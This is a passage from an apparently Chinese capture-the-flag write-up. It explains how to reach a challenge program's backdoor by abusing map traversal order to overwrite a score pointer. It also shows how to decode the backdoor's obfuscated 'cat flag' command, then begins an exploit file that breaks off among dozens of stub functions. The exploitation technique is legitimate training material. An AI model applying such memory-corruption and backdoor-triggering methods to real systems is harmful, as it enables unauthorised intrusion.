src="https://img-blog.csdnimg.cn/70f4dceb45da4e708ea6a51d59505293.png"><br>至此，我们已经知道应该如何恶意修改score的值了。<strong>需要注意的是，map的遍历顺序是由value的大小决定的。本题中这里的map的key是字符串类型，因此其遍历顺序就是：字符串小的先遍历到，字符串大的后遍历到。遍历顺序对于我们正确写入score至关重要，这也要求我们设计好调用其他函数的函数名，不能随便起名。</strong></p><h1 id="Step-3-解密"><a href="#Step-3-解密" class="headerlink" title="Step 3: 解密"></a>Step 3: 解密</h1><p>现在我们已经能够执行到后门了，但是后门的cmd指令原本是8个字节的乱码。下面来分析一下应该如何解密。</p><p><img src="https://img-blog.csdnimg.cn/2a0cf7270244479a92d05311fe39671b.png"><br>上面就是初始化的cmd，共8个字节。我们能够对cmd进行的操作只有两个逐字节异或、一个逐字节加和一个减。因此字节与字节之间并没有关系，明文中相同字母最终会被加密为相同的密文。基于这个特性我们发现，在密文中有两个0x68，位于第2和第7个字节。合理猜测一下，明文极有可能是”cat flag”。即0x68是由0x61(‘a’)加密而来。</p><p>下面我们来分析一下，如何才能通过4种操作解密。需要注意的是，明文中的所有字符的最高位都为0，但是密文中的第1和第6个字节的高位是9，说明最高1比特为1。两个异或（一个0x14，一个0x7F）都不会改变最高比特的值，那么最高比特从0变成1，有可能是从正数被减成了负数。</p><p>我们尝试将所有明文字节都与0x14和0x7F异或一次，发现第1个字节’c’和第6个字节’l’异或的结果比其他字母异或的结果都要小，且小于9。因此如果将此时的所有字节全部减9就可以得到第1个字节和第6个字节的最高比特1。</p><p>然后我们再一次进行异或尝试，笔者的运气还算不错，没有尝试多长时间就试出来了。读者可以尝试采用爆破的方式解密，不过笔者没有尝试过，不知道是否可以爆破出来。</p><p>解密的算法是：加2、异或0x14、异或0x7F、减9、加18、异或0x14、异或0x7F。</p><h1 id="Step-4-编写exp"><a href="#Step-4-编写exp" class="headerlink" title="Step 4: 编写exp"></a>Step 4: 编写exp</h1><p>首先为了能够解密cmd，我们需要按照上一个步骤的顺序调用原神梗那4个函数，解密完毕后，我们需要定义256个函数，这256个函数的函数名依次递增，且都有1个int类型的参数。在gamestart函数中依次调用这256个函数1次，然后再一次调用其中几个特定的函数来修改score。（注意score保存的是地址不是score的真实值，需要修改成一个有效地址才行）</p><p>exp.c:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">fight</span><span class="params">(<span class="type">int</span> weapon)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span> weapon1, <span class="type">int</span> weapon2)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">destroy</span><span class="params">(<span class="type">int</span> weapon)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">upgrade</span><span class="params">(<span class="type">int</span> val)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">wuxiangdeyidao</span><span class="params">()</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">zhanjinniuza</span><span class="params">()</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">guobapenhuo</span><span class="params">()</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">tiandongwanxiang</span><span class="params">()</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other000</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other001</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other002</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other003</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other004</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other005</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other006</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other007</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other008</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other009</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other010</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other011</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other012</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other013</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other014</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other015</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other016</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other017</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other018</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other019</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other020</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other021</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other022</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other023</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other024</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other025</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other026</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other027</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other028</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other029</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other030</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other031</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other032</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other033</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other034</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other035</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other036</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other037</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other038</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other039</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other040</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other041</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other042</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other043</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other044</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other045</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other046</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other047</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other048</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other049</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other050</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other051</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other052</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other053</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other054</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other055</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other056</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other057</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other058</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other059</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other060</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other061</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other062</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other063</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other064</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other065</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other066</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other067</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other068</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other069</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other070</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other071</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other072</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other073</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other074</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other075</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other076</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other077</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other078</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other079</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other080</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other081</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other082</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other083</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other084</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other085</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other086</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other087</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other088</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other089</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other090</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other091</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other092</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title 